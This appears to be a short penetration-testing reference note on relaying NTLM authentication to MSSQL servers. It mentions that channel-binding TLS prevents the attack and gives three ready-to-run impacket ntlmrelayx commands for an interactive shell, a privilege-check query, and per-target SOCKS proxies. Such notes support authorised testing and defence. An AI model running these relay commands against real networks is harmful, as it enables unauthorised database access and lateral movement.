---
title: NTLM Relay to MSSQL
---

[[notes/ad/mssql]] servers can be used as [[notes/ad/ntlm-relay-sink]].
Relaying can be prevented by requiring TLS encryption with *Channel Binding*, but this is not enforced by default ([source](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/connect-to-the-database-engine-using-extended-protection)).

Relay to a single [[notes/ad/mssql]] server and drop into an interactive shell ([source](https://github.com/fortra/impacket/pull/1535)).

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support -i --no-multirelay -t mssql://db01.corp.local
    ~~~

Relay to multiple [[notes/ad/mssql]] servers and execute a predefined SQL query.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support -tf ./mssql.txt -q "SELECT SYSTEM_USER;SELECT USER_NAME();SELECT IS_SRVROLEMEMBER('sysadmin');"
    ~~~

Relay to multiple [[notes/ad/mssql]] servers and start a SOCKS proxy per target.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support -tf ./mssql.txt -socks
    ~~~

It might be necessary to specify the target as IP address.
